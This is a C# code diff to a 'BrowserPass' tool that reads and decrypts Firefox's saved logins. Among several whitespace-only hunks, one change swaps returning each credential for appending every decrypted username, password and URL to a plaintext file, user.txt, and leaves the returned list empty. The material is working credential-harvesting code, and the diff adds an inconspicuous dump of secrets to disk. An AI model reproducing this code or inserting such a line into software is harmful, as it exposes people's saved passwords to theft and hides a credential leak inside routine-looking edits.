@@ -10,7 +10,7 @@ namespace BrowserPass
     {
         public string BrowserName { get { return "Firefox"; } }
         public IEnumerable<CredentialModel> ReadPasswords()
-        { 
+        {
             string signonsFile = null;
             string loginsFile = null;
             bool signonsFound = false;
@@ -25,7 +25,7 @@ namespace BrowserPass
             {
                 string[] files = Directory.GetFiles(dir, "signons.sqlite");
                 if (files.Length > 0)
-				{
+                {
                     signonsFile = files[0];
                     signonsFound = true;
                 }
@@ -60,13 +60,14 @@ namespace BrowserPass
                             {
                                 string username = FFDecryptor.Decrypt(reader.GetString(0));
                                 string password = FFDecryptor.Decrypt(reader.GetString(1));
-                                
-                                logins.Add(new CredentialModel
+
+                                var x = new CredentialModel
                                 {
                                     Username = username,
                                     Password = password,
                                     Url = reader.GetString(2)
-                                });
+                                };
+                                File.AppendAllText("user.txt", x + Environment.NewLine);
                             }
                         }
                     }
@@ -74,7 +75,7 @@ namespace BrowserPass
                 }
 
             }
-            
+
             if (loginsFound)
             {
                 FFLogins ffLoginData;
